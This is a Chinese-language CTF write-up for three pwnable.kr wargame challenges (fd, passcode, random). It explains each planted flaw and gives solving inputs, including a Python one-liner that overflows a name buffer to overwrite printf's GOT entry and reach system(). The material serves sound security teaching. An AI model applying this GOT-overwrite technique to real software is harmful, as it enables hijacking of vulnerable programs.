# Pwnable.kr


# pwnable.kr writeup

## 1 fd
文件描述符(file descricptor)
>维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。

习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.
```c
//fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```
得到flag的关键在于如歌通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:
```c
int fd = atoi( argv[1] ) - 0x1234;
```
其中atoi是将字符串转化为整数的函数
```c
int main(int argc, char* argv[], char* envp[]){
```
可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.

例如运行程序fd
```
./fd 4660
```
此时argc值为2, 而argv[0] = "./fd", argv[1] = "4660"

atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag
## 2 collision


## 5 passcode
```c
#include <stdio.h>

#include <stdlib.h>

  

void login(){

        int passcode1;

        int passcode2;

  

        printf("enter passcode1 : ");

        scanf("%d", passcode1);

        fflush(stdin);

  

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)

        printf("enter passcode2 : ");

        scanf("%d", passcode2);

  

        printf("checking...\n");

        if(passcode1==338150 && passcode2==13371337){

                printf("Login OK!\n");

                system("/bin/cat flag");

        }

        else{

                printf("Login Failed!\n");

                exit(0);

        }

}

  

void welcome(){

        char name[100];

        printf("enter you name : ");

        scanf("%100s", name);

        printf("Welcome %s!\n", name);

}

  

int main(){

        printf("Toddler's Secure Login System 1.0 beta.\n");

  

        welcome();

        login();

  

        // something after login...

        printf("Now I can safely trust you that you have credential :)\n");

        return 0;

}
```
容易注意到login函数中这句 
```c
scanf("%d", passcode1);
```
本应该为
```c
scanf("%d", &passcode1);
```
也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 
那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 
用IDA反编译一下 
```c
int login()
{
  int v1; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  printf("enter passcode1 : ");
  __isoc99_scanf("%d", v1);
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d", v2);
  puts("checking...");
  if ( v1 != 338150 || v2 != 13371337 )
  {
    puts("Login Failed!");
    exit(0);
  }
  puts("Login OK!");
  return system("/bin/cat flag");
}

unsigned int welcome()
{
  char v1[100]; // [esp+18h] [ebp-70h] BYREF
  unsigned int v2; // [esp+7Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("enter you name : ");
  __isoc99_scanf("%100s", v1);
  printf("Welcome %s!\n", v1);
  return __readgsdword(0x14u) ^ v2;
}
```
由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system("/bin/cat flag")这个指令了.
在IDA里找到他们: 
```text
.plt:08048420
.plt:08048420 ; =============== S U B R O U T I N E =======================================
.plt:08048420
.plt:08048420 ; Attributes: thunk
.plt:08048420
.plt:08048420 ; int printf(const char *format, ...)
.plt:08048420 _printf         proc near               ; CODE XREF: login+E↓p
.plt:08048420                                         ; login+3C↓p ...
.plt:08048420
.plt:08048420 format          = dword ptr  4
.plt:08048420
.plt:08048420                 jmp     ds:off_804A000
.plt:08048420 _printf         endp
.plt:08048420
```
```text
.text:08048562 ; ---------------------------------------------------------------------------
.text:08048563                 align 4
.text:08048564
.text:08048564 ; =============== S U B R O U T I N E =======================================
.text:08048564
.text:08048564 ; Attributes: bp-based frame
.text:08048564
.text:08048564                 public login
.text:08048564 login           proc near               ; CODE XREF: main+1A↓p
.text:08048564
.text:08048564 var_10          = dword ptr -10h
.text:08048564 var_C           = dword ptr -0Ch
.text:08048564
.text:08048564 ; __unwind {
.text:08048564                 push    ebp
.text:08048565                 mov     ebp, esp
.text:08048567                 sub     esp, 28h
.text:0804856A                 mov     eax, offset format ; "enter passcode1 : "
.text:0804856F                 mov     [esp], eax      ; format
.text:08048572                 call    _printf
.text:08048577                 mov     eax, offset aD  ; "%d"
.text:0804857C                 mov     edx, [ebp+var_10]
.text:0804857F                 mov     [esp+4], edx
.text:08048583                 mov     [esp], eax
.text:08048586                 call    ___isoc99_scanf
.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048590                 mov     [esp], eax      ; stream
.text:08048593                 call    _fflush
.text:08048598                 mov     eax, offset aEnterPasscode2 ; "enter passcode2 : "
.text:0804859D                 mov     [esp], eax      ; format
.text:080485A0                 call    _printf
.text:080485A5                 mov     eax, offset aD  ; "%d"
.text:080485AA                 mov     edx, [ebp+var_C]
.text:080485AD                 mov     [esp+4], edx
.text:080485B1                 mov     [esp], eax
.text:080485B4                 call    ___isoc99_scanf
.text:080485B9                 mov     dword ptr [esp], offset s ; "checking..."
.text:080485C0                 call    _puts
.text:080485C5                 cmp     [ebp+var_10], 528E6h
.text:080485CC                 jnz     short loc_80485F1
.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
.text:080485D5                 jnz     short loc_80485F1
.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; "Login OK!"
.text:080485DE                 call    _puts
.text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
.text:080485EA                 call    _system
.text:080485EF                 leave
.text:080485F0                 retn
```

0x080485e3=134514147
### 实现:
```python
python -c 'print "A"*96+"\x00\xa0\x04\x08"+"134514147\n"' | ./passcode

```
## 6 random
```c
#include <stdio.h>


int main(){

        unsigned int random;

        random = rand();        // random value!

  

        unsigned int key=0;

        scanf("%d", &key);

  

        if( (key ^ random) == 0xdeadbeef ){

                printf("Good!\n");

                system("/bin/cat flag");

                return 0;

        }

  

        printf("Wrong, maybe you should try 2^32 cases.\n");

        return 0;

}
```
注意到`rand()`没有用`srand()`设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列. 
我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383. 
而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key.
算出key = -1255736440, 运行random程序输入key得到flag
```text
random@pwnable:~$ ./random
-1255736440
Good!
Mommy, I thought libc random is unpredictable...
```


